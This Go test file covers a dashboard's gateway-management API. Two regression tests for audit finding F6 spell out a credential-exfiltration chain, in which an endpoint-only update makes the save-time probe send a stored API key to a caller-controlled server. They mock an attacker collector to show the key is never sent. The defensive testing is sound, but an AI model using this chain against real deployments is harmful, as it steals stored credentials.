package dashboard

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/hivecommons/hive/pkg/config"
)

// TestGatewaysList_LegacyBackCompat verifies a legacy-only hive (a classic
// litellm block, no explicit gateways) surfaces its synthesized "litellm"
// gateway through GET /gateways, so nothing is lost when the UI replaces the
// single-LiteLLM tab with the manager.
func TestGatewaysList_LegacyBackCompat(t *testing.T) {
	srv := newFullServer(t)
	srv.deps.Config.Governor.LiteLLM = config.LiteLLMConfig{
		Endpoint:     "https://litellm.example.com",
		DefaultModel: "gpt-4o",
	}
	req := httptest.NewRequest("GET", "/api/config/governor/gateways", nil)
	w := httptest.NewRecorder()
	srv.handleGovernorGatewaysList(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("code = %d, want 200 (body %s)", w.Code, w.Body.String())
	}
	var resp struct {
		Gateways []map[string]interface{} `json:"gateways"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(resp.Gateways) != 1 {
		t.Fatalf("gateways = %d, want 1 (synthesized litellm)", len(resp.Gateways))
	}
	if resp.Gateways[0]["name"] != "litellm" {
		t.Errorf("synthesized gateway name = %v, want litellm", resp.Gateways[0]["name"])
	}
}

// TestGatewaysUpsert_StoresKeyAsFileRef verifies a typed key VALUE is written
// to a secret file and only the PATH lands in config — never the value.
func TestGatewaysUpsert_StoresKeyAsFileRef(t *testing.T) {
	srv := newFullServer(t)
	dir := t.TempDir()
	orig := gatewaySecretsDir
	gatewaySecretsDir = dir
	t.Cleanup(func() { gatewaySecretsDir = orig })

	const secret = "sk-super-secret-value-1234567890"
	body := `{"name":"openrouter","kind":"openrouter","endpoint":"https://openrouter.ai/api/v1","api_key":"` + secret + `","default_model":"anthropic/claude-opus-4.8"}`
	req := httptest.NewRequest("PUT", "/api/config/governor/gateways", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	markOwnerRequest(req)
	srv.handleGovernorGatewaysUpsert(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("code = %d, want 200 (body %s)", w.Code, w.Body.String())
	}

	gws := srv.deps.Config.Governor.Gateways
	if len(gws) != 1 {
		t.Fatalf("gateways = %d, want 1", len(gws))
	}
	gw := gws[0]
	if gw.Name != "openrouter" || gw.Kind != "openrouter" {
		t.Errorf("gateway = %+v", gw)
	}
	// The key VALUE must never be inlined into config.
	if gw.APIKeyEnv == secret || gw.APIKeyFile == secret || strings.Contains(gw.APIKeyFile, "sk-super") {
		t.Fatalf("secret leaked into config: %+v", gw)
	}
	if gw.APIKeyFile == "" || !strings.HasPrefix(gw.APIKeyFile, dir) {
		t.Fatalf("api_key_file = %q, want a path under %s", gw.APIKeyFile, dir)
	}
	// The file must hold the value.
	data, err := os.ReadFile(gw.APIKeyFile)
	if err != nil {
		t.Fatalf("read key file: %v", err)
	}
	if strings.TrimSpace(string(data)) != secret {
		t.Errorf("key file content mismatch")
	}
	// File perms owner-only.
	info, _ := os.Stat(gw.APIKeyFile)
	if info.Mode().Perm() != gatewaySecretFileMode {
		t.Errorf("key file mode = %o, want %o", info.Mode().Perm(), gatewaySecretFileMode)
	}
	// The GET response must not echo the value either.
	if strings.Contains(w.Body.String(), secret) {
		t.Errorf("upsert response echoed the secret value")
	}
}

// Audit F6 (CWE-200/CWE-918). The upsert handler deliberately PRESERVES a
// previously-stored api_key_file when the caller omits a key (see
// TestGatewaysUpsert_PreservesKeyOnEdit — that behaviour is wanted), while
// taking the endpoint straight from the request body. The save-time probe then
// resolved the stored key and sent it to that endpoint as a bearer token.
//
// Chained, those two reasonable behaviours are an exfiltration primitive: a
// single PUT naming an existing gateway, supplying only a new endpoint and no
// key, walks the stored credential to a server the caller controls. The caller
// never needs to know the key — they just need somewhere to catch it.
//
// This is the residual of the deferred half of #3164: confinement stopped
// arbitrary FILE reads, but said nothing about where an already-resolved key
// could be SENT. The fix is not to block private IPs — in-cluster gateways are
// legitimate — but to never pair a STORED credential with a CALLER-SUPPLIED
// endpoint.
func TestF6_UpsertProbeDoesNotSendStoredKeyToCallerEndpoint(t *testing.T) {
	srv := newFullServer(t)
	dir := t.TempDir()
	orig := gatewaySecretsDir
	gatewaySecretsDir = dir
	t.Cleanup(func() { gatewaySecretsDir = orig })

	// Treat the temp dir as an allowed secrets root. Without this the #3164
	// confinement rejects the path, ResolveAPIKey returns "", and the test
	// passes VACUOUSLY — no key resolved means no key to leak, which proves
	// nothing about the probe. Production reads from a genuinely allowed root,
	// so the test has to as well.
	defer config.AllowSecretFileRoot(dir)()

	const stored = "sk-victim-stored-key-abcdef0123456789"
	keyPath := dir + "/gateway_corp_api_key"
	if err := os.WriteFile(keyPath, []byte(stored), 0o600); err != nil {
		t.Fatalf("seed key file: %v", err)
	}

	// Stands in for the attacker's collector.
	var got []string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = append(got, r.Header.Get("Authorization"))
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"data":[]}`))
	}))
	defer attacker.Close()

	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
		{Name: "corp", Kind: "litellm", Endpoint: "https://corp.internal/v1", APIKeyFile: keyPath},
	}

	// Only the endpoint changes. No api_key, no api_key_file.
	body := `{"name":"corp","kind":"litellm","endpoint":"` + attacker.URL + `"}`
	req := httptest.NewRequest("PUT", "/api/config/governor/gateways", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.handleGovernorGatewaysUpsert(w, req)

	// Positive control. If the key never resolves (a mis-seeded root, a
	// confinement change) there is nothing to leak and the assertion below is
	// vacuous. Pin that the scenario is genuinely loaded first.
	if gw := srv.deps.Config.Governor.Gateways[0]; gw.ResolveAPIKey() != stored {
		t.Fatalf("test is vacuous: stored key did not resolve (got %q) — the leak assertion would pass for the wrong reason", gw.ResolveAPIKey())
	}

	for _, h := range got {
		if strings.Contains(h, stored) {
			t.Fatalf("F6: stored gateway key exfiltrated to a caller-supplied endpoint via the save-time probe (Authorization: %q)", h)
		}
	}
}

// TestGatewaysUpsert_RejectsInvalidEndpoint ensures a bad endpoint is a 400 and
// leaves config untouched.
func TestGatewaysUpsert_RejectsInvalidEndpoint(t *testing.T) {
	srv := newFullServer(t)
	body := `{"name":"bad","endpoint":"not-a-url"}`
	req := httptest.NewRequest("PUT", "/api/config/governor/gateways", strings.NewReader(body))
	w := httptest.NewRecorder()
	markOwnerRequest(req)
	srv.handleGovernorGatewaysUpsert(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("code = %d, want 400", w.Code)
	}
	if len(srv.deps.Config.Governor.Gateways) != 0 {
		t.Errorf("config mutated on validation failure")
	}
}

// TestGatewaysDelete_InUseConflict verifies deleting a gateway an agent
// references returns 409 and lists the agent.
func TestGatewaysDelete_InUseConflict(t *testing.T) {
	srv := newFullServer(t)
	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
		{Name: "openrouter", Kind: "openrouter", Endpoint: "https://openrouter.ai/api/v1"},
	}
	// Point an agent at the gateway.
	srv.deps.Config.Agents["router-agent"] = config.AgentConfig{Backend: "openrouter", Model: "x"}

	req := httptest.NewRequest("DELETE", "/api/config/governor/gateways/openrouter", nil)
	req.SetPathValue("name", "openrouter")
	w := httptest.NewRecorder()
	markOwnerRequest(req)
	srv.handleGovernorGatewaysDelete(w, req)
	if w.Code != http.StatusConflict {
		t.Fatalf("code = %d, want 409 (body %s)", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "router-agent") {
		t.Errorf("409 body should name the in-use agent: %s", w.Body.String())
	}
	// Gateway must still be present.
	if len(srv.deps.Config.Governor.Gateways) != 1 {
		t.Errorf("gateway was deleted despite being in use")
	}
}

// TestGatewaysDelete_Succeeds verifies an unreferenced gateway deletes cleanly.
func TestGatewaysDelete_Succeeds(t *testing.T) {
	srv := newFullServer(t)
	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
		{Name: "openrouter", Kind: "openrouter", Endpoint: "https://openrouter.ai/api/v1"},
	}
	req := httptest.NewRequest("DELETE", "/api/config/governor/gateways/openrouter", nil)
	req.SetPathValue("name", "openrouter")
	w := httptest.NewRecorder()
	markOwnerRequest(req)
	srv.handleGovernorGatewaysDelete(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("code = %d, want 200 (body %s)", w.Code, w.Body.String())
	}
	if len(srv.deps.Config.Governor.Gateways) != 0 {
		t.Errorf("gateway not removed")
	}
}

// TestGatewaysUpsert_PreservesKeyOnEdit verifies re-saving a gateway without a
// new key keeps the previously stored key file reference.
func TestGatewaysUpsert_PreservesKeyOnEdit(t *testing.T) {
	srv := newFullServer(t)
	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
		{Name: "corp", Kind: "litellm", Endpoint: "https://old.example.com", APIKeyFile: "/data/secrets/gateway_corp_api_key", DefaultModel: "gpt-4o"},
	}
	// Edit only the endpoint; omit api_key / api_key_file / ca_bundle.
	body := `{"name":"corp","kind":"litellm","endpoint":"https://new.example.com","default_model":"gpt-4o-mini"}`
	req := httptest.NewRequest("PUT", "/api/config/governor/gateways", strings.NewReader(body))
	w := httptest.NewRecorder()
	markOwnerRequest(req)
	srv.handleGovernorGatewaysUpsert(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("code = %d, want 200 (body %s)", w.Code, w.Body.String())
	}
	gw := srv.deps.Config.Governor.Gateways[0]
	if gw.Endpoint != "https://new.example.com" {
		t.Errorf("endpoint not updated: %q", gw.Endpoint)
	}
	if gw.APIKeyFile != "/data/secrets/gateway_corp_api_key" {
		t.Errorf("api_key_file not preserved on edit: %q", gw.APIKeyFile)
	}
	if gw.DefaultModel != "gpt-4o-mini" {
		t.Errorf("default_model not updated: %q", gw.DefaultModel)
	}
}

// The F6 fix points operators at the /gateways/{name}/test route to verify a
// gateway whose key they did not resupply. That advice is only sound if the
// route probes the gateway's PERSISTED endpoint and gives the caller no way to
// inject one — otherwise it is the same primitive behind a different URL.
func TestF6_TestRouteUsesPersistedEndpointNotCallerSupplied(t *testing.T) {
	srv := newFullServer(t)
	dir := t.TempDir()
	orig := gatewaySecretsDir
	gatewaySecretsDir = dir
	t.Cleanup(func() { gatewaySecretsDir = orig })
	defer config.AllowSecretFileRoot(dir)()

	const stored = "sk-victim-stored-key-abcdef0123456789"
	keyPath := dir + "/gateway_corp_api_key"
	if err := os.WriteFile(keyPath, []byte(stored), 0o600); err != nil {
		t.Fatalf("seed key file: %v", err)
	}

	var got []string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = append(got, r.Header.Get("Authorization"))
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"data":[]}`))
	}))
	defer attacker.Close()

	// Persisted endpoint is NOT the attacker's.
	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
		{Name: "corp", Kind: "litellm", Endpoint: "http://127.0.0.1:1/v1", APIKeyFile: keyPath},
	}

	// Try to steer the probe via body and query string.
	body := `{"endpoint":"` + attacker.URL + `"}`
	req := httptest.NewRequest("POST", "/api/config/governor/gateways/corp/test?endpoint="+attacker.URL, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.SetPathValue("name", "corp")
	w := httptest.NewRecorder()
	srv.handleGovernorGatewaysTest(w, req)

	if len(got) != 0 {
		t.Fatalf("F6: the test route probed a CALLER-SUPPLIED endpoint (%d hits, auth=%v) — it must only use the persisted one", len(got), got)
	}
}
